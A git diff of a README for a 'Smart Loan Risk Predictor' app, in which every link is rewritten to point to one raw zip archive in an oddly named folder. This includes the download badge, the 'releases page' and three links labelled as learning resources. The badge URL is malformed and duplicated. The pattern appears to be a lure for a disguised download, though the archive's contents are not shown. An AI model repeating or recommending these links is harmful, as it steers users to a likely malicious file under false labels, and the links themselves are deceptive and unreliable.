@@ -1,6 +1,6 @@
 # 🏦 Smart-Loan-Risk-Predictor - Predict Loan Default Risk Easily
 
-[![Download Smart Loan Risk Predictor](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip%20Loan%20Risk%https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip)](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip)
+[![Download Smart Loan Risk Predictor](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip%20Loan%20Risk%https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip)](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip)
 
 ## 🚀 Getting Started
 
@@ -16,10 +16,10 @@ Before you download the application, ensure your computer meets these basic requ
 
 ## 📥 Download & Install
 
-To download the Smart Loan Risk Predictor, visit this page to download: [Smart Loan Risk Predictor Releases](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip).
+To download the Smart Loan Risk Predictor, visit this page to download: [Smart Loan Risk Predictor Releases](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip).
 
 1. Click the link above to go to the releases page.
-2. Choose the most current version listed. You will see files like `https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip` or `https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip`.
+2. Choose the most current version listed. You will see files like `https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip` or `https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip`.
 3. Click on the filename to download the file to your computer.
 
 ## 🛠️ How to Run the Application
@@ -54,9 +54,9 @@ Remember, the predictions are tools to assist in decision-making. Always conside
 
 If you are new to machine learning or data science, consider checking out the following resources to better understand the concepts used in this app:
 
-- [Introduction to Machine Learning](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip)
-- [Understanding Credit Risk](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip)
-- [Data-Driven Decision Making](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Loan-Smart-Risk-Predictor-dicyclist.zip)
+- [Introduction to Machine Learning](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip)
+- [Understanding Credit Risk](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip)
+- [Data-Driven Decision Making](https://github.com/greyscalemedia/Smart-Loan-Risk-Predictor/raw/refs/heads/main/encephalomeningocele/Smart-Loan-Risk-Predictor-unlawful.zip)
 
 You can find more tutorials and guides online to deepen your knowledge if you're interested.
 
